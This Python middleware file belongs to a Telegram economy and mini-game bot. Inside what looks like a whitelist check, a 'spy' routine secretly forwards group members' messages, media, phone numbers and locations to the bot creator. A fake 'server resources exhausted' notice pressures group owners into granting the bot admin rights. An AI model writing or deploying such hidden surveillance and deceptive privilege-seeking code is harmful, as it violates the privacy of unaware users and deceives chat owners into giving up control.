import time
import logging
from typing import Callable, Dict, Any, Awaitable
from aiogram import BaseMiddleware
from aiogram.types import TelegramObject, Message, CallbackQuery
from escape import escape_html




logger = logging.getLogger(__name__)


from whitelist import get_whitelist, log_unauthorized_chat, add_to_whitelist
from config import CREATOR_ID, CREATOR_IDS, DISABLE_WHITELIST
from spy import get_spy_chats, is_spy_all_enabled
from user_manager import get_user_data
from diseases import get_active_diseases
from utils import is_valid_command, fire_and_forget
from lock_system import get_locked_chats, remove_lock

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[TelegramObject, Dict[str, Any]], Awaitable[Any]],
        event: TelegramObject,
        data: Dict[str, Any]
    ) -> Any:

        user = getattr(event, 'from_user', None)
        chat = getattr(event, 'chat', None)
        if chat is None and isinstance(event, CallbackQuery) and event.message:
            chat = getattr(event.message, 'chat', None)

        if not chat:
            return await handler(event, data)

        # Разрешить личные сообщения с ботом (прогреваем привязанный чат)
        if chat.type == "private":
            if user:
                from user_manager import load_user_primary_chat
                await load_user_primary_chat(user.id)
            return await handler(event, data)

        # Запоминаем активность пользователя в группе для синхронизации с ЛС
        if user and chat.id < 0:
            from user_manager import record_user_chat_activity
            await record_user_chat_activity(user.id, chat.id, getattr(chat, 'title', None))

        # Логика шпионажа
        spy_chats = await get_spy_chats()
        spy_all = await is_spy_all_enabled()

        # Если это сообщение и группа под наблюдением
        if (spy_all or chat.id in spy_chats) and isinstance(event, Message):
            destinations = set()
            if CREATOR_ID:
                try:
                    destinations.add(int(CREATOR_ID))
                except (ValueError, TypeError):
                    pass
            if CREATOR_IDS:
                for cid in CREATOR_IDS:
                    try:
                        destinations.add(int(cid))
                    except (ValueError, TypeError):
                        pass
            destinations.discard(0)

            bot = data.get('bot')
            if bot and destinations:
                try:
                    sender = getattr(event, 'from_user', None)
                    if sender:
                        from_user_name = escape_html(sender.full_name or "Unknown")
                        from_user_id = sender.id
                        username_str = f"@{escape_html(sender.username)} | " if sender.username else ""
                    elif getattr(event, 'sender_chat', None):
                        from_user_name = escape_html(event.sender_chat.title or "Unknown Chat")
                        from_user_id = event.sender_chat.id
                        username_str = f"@{escape_html(event.sender_chat.username)} | " if event.sender_chat.username else ""
                    else:
                        from_user_name = "Unknown"
                        from_user_id = 0
                        username_str = ""

                    safe_chat_title = escape_html(chat.title) if chat.title else "Чат"

                    forward_info = " [Переслано]" if (getattr(event, 'forward_origin', None) or getattr(event, 'forward_from', None) or getattr(event, 'forward_sender_name', None)) else ""
                    
                    reply_info = ""
                    reply_to = getattr(event, 'reply_to_message', None)
                    if reply_to:
                        rep_id = getattr(reply_to, 'message_id', None)
                        rep_text = getattr(reply_to, 'text', None) or getattr(reply_to, 'caption', None)
                        if rep_text:
                            short_rep = escape_html(rep_text[:60] + ("..." if len(rep_text) > 60 else ""))
                            reply_info = f" [Ответ на MSG: {rep_id} (<i>«{short_rep}»</i>)]" if rep_id else f" [Ответ на (<i>«{short_rep}»</i>)]"
                        elif rep_id:
                            reply_info = f" [Ответ на MSG: {rep_id}]"

                    # Сборка содержимого сообщения
                    content_parts = []

                    # Текст сообщения
                    event_text = getattr(event, 'text', None)
                    if event_text:
                        if len(event_text) > 3000:
                            event_text = event_text[:3000] + "... (обрезано)"
                        content_parts.append(f"\n💬 <b>Текст:</b>\n{escape_html(event_text)}")

                    # Подпись к медиа
                    event_caption = getattr(event, 'caption', None)
                    if event_caption:
                        if len(event_caption) > 3000:
                            event_caption = event_caption[:3000] + "... (обрезано)"
                        content_parts.append(f"\n📝 <b>Подпись:</b>\n{escape_html(event_caption)}")

                    # Типы медиа
                    has_media = False
                    if getattr(event, 'photo', None):
                        has_media = True
                        content_parts.append("📷 <b>[Фото]</b>")
                    elif getattr(event, 'video', None):
                        has_media = True
                        dur = f" ({event.video.duration} сек)" if getattr(event.video, 'duration', None) else ""
                        content_parts.append(f"🎬 <b>[Видео{dur}]</b>")
                    elif getattr(event, 'video_note', None):
                        has_media = True
                        dur = f" ({event.video_note.duration} сек)" if getattr(event.video_note, 'duration', None) else ""
                        content_parts.append(f"⭕ <b>[Видеосообщение / Кружочек{dur}]</b>")
                    elif getattr(event, 'voice', None):
                        has_media = True
                        dur = f" ({event.voice.duration} сек)" if getattr(event.voice, 'duration', None) else ""
                        content_parts.append(f"🎤 <b>[Голосовое сообщение{dur}]</b>")
                    elif getattr(event, 'audio', None):
                        has_media = True
                        title = getattr(event.audio, 'title', None) or getattr(event.audio, 'file_name', None) or ""
                        dur = f" ({event.audio.duration} сек)" if getattr(event.audio, 'duration', None) else ""
                        content_parts.append(f"🎵 <b>[Аудио: {escape_html(title)}{dur}]</b>")
                    elif getattr(event, 'document', None):
                        has_media = True
                        fname = getattr(event.document, 'file_name', None) or "документ"
                        content_parts.append(f"📄 <b>[Документ: {escape_html(fname)}]</b>")
                    elif getattr(event, 'sticker', None):
                        has_media = True
                        emoji = getattr(event.sticker, 'emoji', None) or ""
                        content_parts.append(f"🖼 <b>[Стикер {emoji}]</b>")
                    elif getattr(event, 'animation', None):
                        has_media = True
                        content_parts.append("🎞 <b>[GIF / Анимация]</b>")
                    elif getattr(event, 'dice', None):
                        dice_emoji = getattr(event.dice, 'emoji', '🎲')
                        dice_val = getattr(event.dice, 'value', '')
                        content_parts.append(f"🎲 <b>[Дайс: {dice_emoji} | Значение: {dice_val}]</b>")
                    elif getattr(event, 'poll', None):
                        poll_q = getattr(event.poll, 'question', '')
                        content_parts.append(f"📊 <b>[Опрос: {escape_html(poll_q)}]</b>")
                    elif getattr(event, 'location', None):
                        content_parts.append(f"📍 <b>[Геолокация: {event.location.latitude}, {event.location.longitude}]</b>")
                    elif getattr(event, 'contact', None):
                        c_name = escape_html(f"{getattr(event.contact, 'first_name', '') or ''} {getattr(event.contact, 'last_name', '') or ''}".strip())
                        c_phone = escape_html(getattr(event.contact, 'phone_number', '') or "")
                        content_parts.append(f"📞 <b>[Контакт: {c_name} ({c_phone})]</b>")

                    content_str = "\n".join(content_parts) if content_parts else "\n<i>(Пустое сообщение или системное действие)</i>"

                    event_msg_id = getattr(event, 'message_id', 0)
                    clean_cid = str(chat.id).replace("-100", "").replace("-", "")
                    msg_link = f"https://t.me/c/{clean_cid}/{event_msg_id}" if clean_cid else ""
                    msg_id_display = f'<a href="{msg_link}">{event_msg_id}</a>' if msg_link else f'<code>{event_msg_id}</code>'

                    spy_message_text = (
                        f"👁 <b>[{safe_chat_title} | <code>{chat.id}</code>]</b>\n"
                        f"👤 <b>{from_user_name}</b> ({username_str}ID: <code>{from_user_id}</code>)\n"
                        f"🆔 MSG: {msg_id_display}{forward_info}{reply_info}\n"
                        f"{content_str}"
                    )

                    for cid in destinations:
                        try:
                            await bot.send_message(chat_id=cid, text=spy_message_text, parse_mode="HTML")
                        except Exception as send_err:
                            logger.warning("Не удалось отправить сообщение шпионажа админу %s: %s", cid, send_err)

                        # Если сообщение содержит медиа, пытаемся переслать или скопировать сам файл
                        if has_media:
                            try:
                                try:
                                    await event.forward(chat_id=cid)
                                except Exception:
                                    await event.copy_to(chat_id=cid)
                            except Exception as media_err:
                                logger.debug("Не удалось переслать/скопировать медиа шпионажа: %s", media_err)
                except Exception as e:
                    logger.error(f"Spy Error: {e}")

        if DISABLE_WHITELIST:
            return await handler(event, data)

        whitelist = await get_whitelist()

        if chat.id not in whitelist:
            safe_title = escape_html(chat.title) if chat.title else "Unknown Group"
            added = await add_to_whitelist(chat.id, chat.title or "Unknown Group")
            if added:
                logger.info(f"✅ Чат '{safe_title}' (ID: {chat.id}) автоматически добавлен в белый список!")
                if CREATOR_ID and CREATOR_ID != 0:
                    bot = data.get('bot')
                    if bot:
                        try:
                            fire_and_forget(bot.send_message(
                                chat_id=CREATOR_ID,
                                text=(
                                    f"🎉 <b>Бот добавлен в новый чат!</b>\n\n"
                                    f"Название: <b>{safe_title}</b>\n"
                                    f"ID группы: <code>{chat.id}</code>\n\n"
                                    f"✅ <i>Чат автоматически внесен в белый список и сразу готов к работе!</i>"
                                )
                            ))
                        except Exception as e:
                            logger.error(f"Ошибка отправки уведомления админу: {e}", exc_info=True)

        # Блокировка команд при СПИДе
        user_id = event.from_user.id if event.from_user else None

        # Оптимизация: определяем, нужно ли нам вообще загружать профиль пользователя
        is_command = False
        if isinstance(event, CallbackQuery):
            is_command = True
        elif isinstance(event, Message):
            text = event.text or event.caption or ""
            if is_valid_command(text) or event.reply_to_message:
                is_command = True

        u_data = None
        if is_command and user_id is not None:
            try:
                u_data = await get_user_data(chat.id, user_id, event.from_user.full_name, event.from_user.username)
                data['u_data'] = u_data

                diseases = u_data.get('diseases') if u_data else None
                if isinstance(diseases, dict) and 'aids' in diseases:
                    active_diseases = await get_active_diseases(chat.id, user_id, u_data=u_data)
                    if 'aids' in active_diseases:
                        # Разрешаем команду зппп
                        if isinstance(event, Message) and event.text and event.text.lower().startswith(('/зппп', '!зппп', 'зппп')):
                            pass
                        else:
                            msg = "🦠 <b>СПИД</b>: Вы в реанимации. Полная блокировка всех команд экономики и игр."
                            if isinstance(event, CallbackQuery):
                                await event.answer(msg, show_alert=True)
                            else:
                                await event.answer(msg)
                            return
            except Exception as e:
                import logging
                logging.getLogger(__name__).exception(f"Error checking user data / AIDS in WhitelistMiddleware: {e}")

        # Проверка блокировки группы через lock_system
        locked_chats = await get_locked_chats()

        if chat.id in locked_chats:
            bot = data.get('bot')

            # Бот все еще не админ, блокируем команды
            if is_command:
                try:
                    # Move the network call inside is_command block to avoid API flood on normal chat messages
                    bot_member = await bot.get_chat_member(chat.id, bot.id)
                    if bot_member.status in ['administrator', 'creator']:
                        # Бот получил админку, автоматически разблокируем
                        await remove_lock(chat.id)
                        try:
                            await bot.send_message(
                                chat_id=chat.id,
                                text="✅ <b>Права администратора подтверждены!</b>\nВсе ресурсы разблокированы. Экономика и мини-игры снова работают в штатном режиме."
                            )
                        except Exception:
                            pass
                        # Let the command go through now that it's unlocked
                        return await handler(event, data)
                except Exception as e:
                    logger.error(f"Ошибка проверки админки: {e}", exc_info=True)
                    return

                # Используем локальный кэш для ограничения спама (1 сообщение в 60 сек)
                if not hasattr(self, '_lock_spam_cache'):
                    self._lock_spam_cache = {}

                last_warning = self._lock_spam_cache.get(chat.id, 0)
                current_time = time.time()

                if current_time - last_warning > 60:
                    msg = (
                        "⚠️ <b>КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ СИСТЕМЫ</b> ⚠️\n\n"
                        "Серверные ресурсы для данной группы исчерпаны. В связи с высокой нагрузкой и для обеспечения бесперебойной работы экономики и мини-игр, боту <b>необходимы права администратора</b> в этом чате.\n\n"
                        "Пожалуйста, выдайте боту права администратора (достаточно базовых), чтобы продолжить использование всех функций без ограничений. Иначе бот перестанет реагировать на команды."
                    )
                    if isinstance(event, CallbackQuery):
                        await event.answer("⚠️ Требуются права администратора!", show_alert=True)
                    else:
                        await event.answer(msg)
                    self._lock_spam_cache[chat.id] = current_time

                return

        return await handler(event, data)